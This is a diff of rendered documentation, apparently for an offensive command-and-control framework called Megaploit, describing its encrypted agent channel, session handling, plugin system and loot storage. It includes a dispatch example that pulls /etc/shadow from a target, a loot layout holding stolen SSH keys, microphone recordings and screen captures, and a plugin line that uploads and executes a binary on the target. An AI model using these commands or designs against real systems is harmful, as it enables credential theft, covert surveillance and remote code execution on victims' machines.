-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>  GET  /events              → SSE stream (text/event-stream)
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>SSE mechanism:
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>  _subscribers = list[queue.Queue]
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>  GET /events → register sub_q → yield from sub_q with 20s timeout
-</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>  _broadcast(type, message) → put to all sub_q
-</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>
-</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>Auth: X-API-Key header or ?apikey= query param
+<h2 id="transport-layers">Transport Layers<a class="headerlink" href="#transport-layers" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Application data (JSON command / response)
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>         │
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>         ▼
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>  AES-256-GCM encryption (protocol.py)
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>         │
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>         ▼
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>  Length-prefix framing (4B big-endian)
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>         │
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>         ▼
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>  TLS (optional, via ssl.wrap_socket)
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>         │
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>         ▼
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>  TCP socket
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>         │
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>         │  OR
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>         ▼
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>  WebSocket framing (HTTP Upgrade)
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>         │
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>         ▼
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>  TLS (optional)
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>         │
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>         ▼
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>  TCP socket
 </span></code></pre></div>
 <hr />
-<h3 id="megaploitwebrpcpy-multi-operator-rpc-architecture"><code>megaploit/web/rpc.py</code> — Multi-Operator RPC Architecture<a class="headerlink" href="#megaploitwebrpcpy-multi-operator-rpc-architecture" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>RpcServer._accept_loop()
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    └── TCP accept → Operator(conn_id, sock, addr)
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>        └── threading.Thread → _handle_operator(op)
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>            └── buf += sock.recv() → split on \n → _dispatch(op, line)
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>                └── json.loads → method lookup → handler → send result
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>Broadcast:
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>  _broadcast_notification(method, params, exclude=conn_id)
-</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>  → iterates _operators.values() → op.send_notification()
+<h2 id="authentication-flow">Authentication Flow<a class="headerlink" href="#authentication-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Operator listener               Agent
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>      │                           │
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>      │◄─── TCP connect ──────────│
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>      │                           │
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>      │──── 16-byte challenge ────►│
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>      │                           │
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>      │◄─── HMAC-SHA256(key,      │
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>      │     challenge) ───────────│
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>      │                           │
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>      │  verify with              │
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>      │  compare_digest()         │
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>      │                           │
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>      │  if OK: session accepted  │
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>      │  if FAIL: disconnect,     │
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>      │           rate-limit IP   │
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>      │                           │
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>      │◄═══ AES-256-GCM channel ══│
 </span></code></pre></div>
-<p>JSON-RPC 2.0 over raw TCP, newline-delimited.</p>
 <hr />
-<h3 id="megaploitcoreautorunpy-autorunscript"><code>megaploit/core/autorun.py</code> — AutoRunScript<a class="headerlink" href="#megaploitcoreautorunpy-autorunscript" title="Permanent link">&para;</a></h3>
-<p>Config file <code>~/.megaploit_autorun.json</code> is loaded at startup.</p>
-<p>Resolution order per session:
-1. <code>config["global"]</code> — always included
-2. <code>config[platform_key]</code> where <code>platform_key ∈ {windows, linux, darwin}</code> and matches <code>session.os_name.lower()</code>
-3. <code>config["tags"][session.tag]</code> — if tag matches</p>
-<p>The <code>Pipeline</code> class wraps <code>AutoRunScript</code> and adds named profiles on top.</p>
-<p>Hook in <code>Console._on_new_session()</code>:
-<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">cmds</span> <span class="o">=</span> <span class="n">_pipeline</span><span class="o">.</span><span class="n">commands_for</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>   <span class="c1"># autorun + active profiles</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="p">[</span><span class="n">dispatch</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">])</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></code></pre></div></p>
+<h2 id="session-lifecycle">Session Lifecycle<a class="headerlink" href="#session-lifecycle" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>1. Agent connects → listener accepts socket
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>2. Authentication (HMAC challenge/response)
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>3. Session object created (ID, IP, port, loot paths)
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>4. Session added to sessions dict
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>5. Console shows &quot;NEW SESSION #N&quot; notification
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>6. Pipeline / AutoRunScript runs (background thread, 0.5s delay)
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>7. Operator types `use N` → session loop starts
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>8. Operator types commands → dispatched to agent via AES channel
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>9. Agent receives command → runs handler → sends response
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>10. Session loop receives response → prints to console
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>11. Operator types `background` → returns to global prompt
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>    (session stays alive)
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>12. Agent disconnects (network loss / `exit`) → session removed
+</span></code></pre></div>
 <hr />
-<h3 id="megaploitdbdatabasepy-sqlite-engine"><code>megaploit/db/database.py</code> — SQLite Engine<a class="headerlink" href="#megaploitdbdatabasepy-sqlite-engine" title="Permanent link">&para;</a></h3>
-<p>Tables:
-- <code>hosts</code> — IP, hostname, OS, notes, first/last seen
-- <code>services</code> — host_id, port, protocol, service name, version, banner
-- <code>credentials</code> — host, username, secret, cred_type, source
-- <code>notes</code> — session_id, text, timestamp
-- <code>loot</code> — session_id, file path, description, size
-- <code>jobs</code> — name, status, started, finished, result
-- <code>engagements</code> — name, description, start_time</p>
-<p>The singleton <code>db</code> is imported as <code>from megaploit.db.database import db</code>.</p>
+<h2 id="command-dispatch">Command Dispatch<a class="headerlink" href="#command-dispatch" title="Permanent link">&para;</a></h2>
+<p>When you type a command in a session:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Operator types: &quot;download /etc/shadow&quot;
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>        │
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>        ▼
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>cli.py _session_loop()
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>        │
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>        ▼  calls
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>commands.dispatch(session, &quot;download /etc/shadow&quot;)
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>        │
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>        ▼  looks up &quot;download&quot; in _registry
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>cmd_download(session, [&quot;/etc/shadow&quot;])
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>        │
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>        ├── send_msg(conn, &quot;download /etc/shadow&quot;)   ← to agent
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>        │
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>        │  ← agent sends FILE_OK, then file bytes
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>        │
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>        ├── recv_file(conn, local_path)
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>        │
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>        └── returns CommandResult(ok=True, output=&quot;[+] Saved to: loot/...&quot;)
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>        │
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>        ▼
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>cli.py prints the result
+</span></code></pre></div>
 <hr />
-<h2 id="thread-safety">Thread Safety<a class="headerlink" href="#thread-safety" title="Permanent link">&para;</a></h2>
-<table>
-<thead>
-<tr>
-<th>Object</th>
-<th>Guard</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Console._sessions</code></td>
-<td><code>Console._sessions_lock</code></td>
-</tr>
-<tr>
-<td>Protocol state dict</td>
-<td><code>threading.Lock</code> in <code>protocol.py</code></td>
-</tr>
-<tr>
-<td><code>PluginLoader._plugins</code></td>
-<td><code>threading.Lock</code> in <code>loader.py</code></td>
-</tr>
-<tr>
-<td><code>RpcServer._operators</code></td>
-<td><code>RpcServer._op_lock</code></td>
-</tr>
-<tr>
-<td><code>JobManager._jobs</code></td>
-<td><code>JobManager._lock</code></td>
-</tr>
-<tr>
-<td><code>Pipeline._active_profiles</code></td>
-<td><code>Pipeline._lock</code></td>
-</tr>
-<tr>
-<td><code>_CommandHistory._buf</code></td>
-<td><code>_CommandHistory._lock</code></td>
-</tr>
-</tbody>
-</table>
+<h2 id="agent-side-architecture">Agent-Side Architecture<a class="headerlink" href="#agent-side-architecture" title="Permanent link">&para;</a></h2>
+<p>The agent runs two threads:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Thread 1 — Main shell loop (shell.py)
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>  while True:
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    msg = recv_msg(conn)            # blocks waiting for operator command
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    if &quot;PING&quot;: continue             # discard heartbeats
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>    result = dispatch_handler(msg)  # handlers.py or meterp.py
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>    send_msg(conn, result)
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>Thread 2 — Heartbeat (every 30s)
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>  while True:
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    send_msg(conn, &quot;PING&quot;)          # keep-alive
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    sleep(30)
+</span></code></pre></div>
+<p>The server's <code>recv_msg</code> wrapper silently discards <code>PING</code> frames to keep the protocol in sync.</p>
 <hr />
-<h2 id="file-layout-key-paths">File Layout — Key Paths<a class="headerlink" href="#file-layout-key-paths" title="Permanent link">&para;</a></h2>
-<table>
-<thead>
-<tr>
-<th>Path</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>secret.key</code></td>
-<td>64-char hex HMAC secret</td>
-</tr>
-<tr>
-<td><code>loot/audit.log</code></td>
-<td>Connection + command audit trail</td>
-</tr>
-<tr>
-<td><code>loot/&lt;session_id&gt;/</code></td>
-<td>Per-session loot directory</td>
-</tr>
-<tr>
-<td><code>tools/tools.json</code></td>
-<td>Persistent toolbox catalogue</td>
-</tr>
-<tr>
-<td><code>~/.megaploit.json</code></td>
-<td>Operator settings (lhost, port, aliases, etc.)</td>
-</tr>
-<tr>
-<td><code>~/.megaploit_history.json</code></td>
-<td>Command history (500 entries)</td>
-</tr>
-<tr>
-<td><code>~/.megaploit_autorun.json</code></td>
-<td>AutoRunScript config</td>
-</tr>
-</tbody>
-</table>
+<h2 id="loot-organization">Loot Organization<a class="headerlink" href="#loot-organization" title="Permanent link">&para;</a></h2>
+<p>Every piece of collected data is saved automatically:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>loot/
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>  audit.log                  ← every command: timestamp, session, IP, status
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>  tls/
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    cert.pem, key.pem        ← auto-generated TLS certificate
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>  .session_1.history         ← per-session readline history
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>  session_1_10.0.0.42/
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    screenshots/
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>      20240115_143022.png    ← PNG with embedded metadata (IP, timestamp)
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    recordings/
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>      20240115_150000.wav    ← microphone recordings
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    downloads/
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>      shadow                 ← downloaded files
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>      id_rsa
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>    stream/
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>      frame_0001.jpg         ← screenshot stream frames
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>      frame_0002.jpg
+</span></code></pre></div>
+<hr />
+<h2 id="plugin-system-architecture">Plugin System Architecture<a class="headerlink" href="#plugin-system-architecture" title="Permanent link">&para;</a></h2>
+<p>Plugins extend Megaploit without modifying Python code.</p>
+<p><strong>TOML plugin file</strong> (<code>plugins/my_plugin.toml</code>):</p>
+<div class="language-toml highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;my_plugin&quot;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;1.0&quot;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">author</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;you&quot;</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">[[command]]</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;portscan&quot;</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">kind</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;local&quot;</span><span class="w">              </span><span class="c1"># run locally on operator machine</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">shell</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;nmap -sV -p {arg0:-1-1000} {session_ip}&quot;</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">120</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="k">[[command]]</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="n">name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;deploy_tool&quot;</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="n">kind</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;session&quot;</span><span class="w">            </span><span class="c1"># run on target via C2 channel</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="n">shell</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;upload {arg0} &amp;&amp; shell chmod +x {arg0} &amp;&amp; shell ./{arg0}&quot;</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="n">dangerous</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="k">[[command]]</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="n">name</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;custom_python&quot;</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="n">kind</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;python&quot;</span><span class="w">             </span><span class="c1"># run Python handler function</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;my_plugin.handle_custom&quot;</span>
+</span></code></pre></div>
+<p><strong>Handler function</strong> (for <code>kind = "python"</code>):</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># plugins/my_plugin.py</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.server.commands</span><span class="w"> </span><span class="kn">import</span> <span class="n">CommandResult</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_custom</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>    <span class="c1"># full access to session and C2 commands</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    <span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.server.commands</span><span class="w"> </span><span class="kn">import</span> <span class="n">dispatch</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">dispatch</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>    <span class="k">return</span> <span class="n">CommandResult</span><span class="p">(</span><span class="n">ok</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">output</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;Custom: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">output</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>Plugins are hot-reloaded when files change (if <code>plugins watcher on</code> is enabled).</p>
+<hr />
+<h2 id="module-registry-auto-discovery">Module Registry Auto-Discovery<a class="headerlink" href="#module-registry-auto-discovery" title="Permanent link">&para;</a></h2>
+<p>The registry uses <code>os.walk()</code> to recursively scan <code>megaploit/modules/</code>:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Any .py file with MODULE = SomeClass at module level is registered</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># The module&#39;s name attribute determines its path in the catalogue</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
